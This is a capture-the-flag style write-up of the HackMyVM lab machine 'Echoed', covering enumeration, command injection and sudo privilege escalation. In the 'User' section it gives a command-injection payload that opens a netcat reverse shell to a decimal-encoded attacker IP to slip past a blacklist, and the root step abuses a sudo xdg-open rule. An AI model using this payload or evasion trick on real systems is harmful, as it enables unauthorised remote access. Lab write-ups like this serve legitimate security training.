---
layout: post
author: maxin
title:  "Echoed"
date:   2022-01-01 09:48:24 PM -03
category: HackMyVM
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Echoed)

# Enumeration

{% highlight text  %}
# Nmap 7.92 scan initiated Wed Dec 29 20:31:35 2021 as: nmap -sC -sV -v -oN nmap 192.168.0.59
Nmap scan report for 192.168.0.59
Host is up (0.017s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 de:3a:50:8e:5d:21:09:7e:40:3f:b2:07:bb:41:08:7e (RSA)
|   256 5c:57:56:da:e5:1c:3e:bc:9a:a2:8d:6d:21:4e:bc:f9 (ECDSA)
|_  256 f8:aa:dc:d3:27:52:e3:99:32:98:45:5b:52:f0:bc:e1 (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
4444/tcp open  krb524?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 29 20:34:32 2021 -- 1 IP address (1 host up) scanned in 177.11 seconds
{% endhighlight  %}

# Port 80

{% highlight text  %}
If you dont see Command: prompt in the XXXX port, please restart the VM.
{% endhighlight  %}

# Port 4444

It’s a program that echo what we type, but have some kind of blacklist 

![Untitled](/images/echoed/notBlocked.png)

The following word aren’t block

- numbers
- nc
- -e
- /bin/bash

We can create a reverse shell with those commands

# User

Convert ip to decimal, because  `. (dot)`  is blocked.

[IPv4 Address to IP Decimal Conversion \| IPAddressGuide](https://www.ipaddressguide.com/ip)

{% highlight bash  %}
";nc 3232235736 4444 -e /bin/bash;# 
{% endhighlight  %}
Final payload 

# Root

{% highlight bash  %}
sudo -l

User charlie may run the following commands on echoed:
    (ALL : ALL) NOPASSWD: /usr/bin/xdg-open
{% endhighlight  %}

{% highlight bash  %}
sudo xdg-open /root/root.txt
{% endhighlight  %}